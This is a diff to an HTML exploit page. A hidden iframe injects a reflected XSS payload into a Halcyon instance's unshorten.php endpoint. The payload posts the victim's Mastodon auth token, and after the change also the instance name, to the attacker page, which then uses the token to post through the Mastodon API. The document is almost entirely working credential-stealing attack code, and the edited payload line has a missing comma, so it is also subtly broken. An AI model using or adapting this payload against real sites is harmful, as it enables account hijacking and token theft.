@@ -29,10 +29,10 @@
     <script>
       // post #gumba2 baby!
       window.onmessage = ({
-        data: token
+        data: [token, inst]
       }) => {
         const api = new MastodonAPI({
-          instance: "https://mstdn.social",
+          instance: "https://" + inst,
           api_user_token: token
         });
         console.log('Token:', token)
@@ -57,7 +57,7 @@
       }
     </script>
     <iframe title="xss"
-      src="https://halcyon.mstdn.social/unshorten.php?url=%3Cscript%3Etop.postMessage(localStorage.current_authtoken, '*')%3C/script%3E"
+      src="https://halcyon.mstdn.social/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance] '*')%3C/script%3E"
       frameborder="0" style="display: none;"></iframe>
   </body>
 
